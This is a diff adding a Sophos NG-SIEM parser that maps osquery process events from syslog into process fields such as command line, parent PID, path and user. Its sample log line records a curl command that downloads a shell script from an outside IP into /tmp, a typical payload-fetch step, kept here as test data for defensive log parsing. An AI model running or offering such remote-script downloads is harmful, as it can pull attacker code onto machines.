@@ -1,0 +1,32 @@
+!SAMPLE=<158>Oct 15 01:10:41 db02.example.com osqueryd[1187]: {"name":"process_events","hostIdentifier":"db02.example.com","calendarTime":"Thu Oct 15 01:10:41 2026 UTC","unixTime":"1792026641","epoch":"0","counter":"40","numerics":false,"columns":{"auid":"1000","cmdline":"curl -s -o /tmp/x.sh http://198.51.100.9/x.sh","cwd":"/home/adoe","parent":"30090","path":"/usr/bin/curl","pid":"30121","time":"1792026640","uid":"1000"},"action":"added"}
+!CONFIRMWITH=EXPRESSION
+!CONFIRMSTRING=eventType$=="process"
+!SCHEMA=scwx.process
+!TRIMALLOFF
+
+# Parser Studio 0.1.0: https://github.com/Aaronjacobs000/sophos-ngsiem-parser-studio
+# Emulator result, not run in Sophos NG-SIEM. Test with Parse Message and Run Test before you turn it on.
+# Source: osquery result rows over syslog from tables with a process ID and a command line, such as
+# processes, process_events and the incident-response pack's logged_in_users.
+# Child of OSQUERY_SYSLOG_PARENT: each added row to Process, with the host identifier as the computer.
+# json, host, pid, cmd, act, eventType$, sensorType$, hostId$ and eventTimeUsec$ come from the parent.
+
+computerName$ = IF host != "" THEN host ELSE NULL
+processId$ = pid
+commandline$ = cmd
+parent = STRING(json["$.columns.parent"])
+parentProcessId$ = IF parent != "" THEN parent ELSE NULL
+path = STRING(json["$.columns.path"])
+imagePath$ = IF path != "" THEN path ELSE NULL
+name = STRING(json["$.columns.name"])
+base = path|(?P<b>[^/\\]+)$
+process$ = IF name != "" THEN name ELSE NULL
+process$ = IF name == "" AND base["b"] != "" THEN base["b"] ELSE process$
+# The user column is logged_in_users'; processes and process_events give only a uid.
+user = STRING(json["$.columns.user"])
+user = IF user == "" THEN STRING(json["$.columns.username"]) ELSE user
+username$ = IF user != "" THEN user ELSE NULL
+# start_time (processes) is when the process started, in epoch seconds.
+st = STRING(json["$.columns.start_time"])
+stOk = st|^(?P<n>\d{9,11})$
+processCreateTimeUsec$ = IF stOk["n"] != "" THEN INT(stOk["n"], 10) * 1000000 ELSE NULL
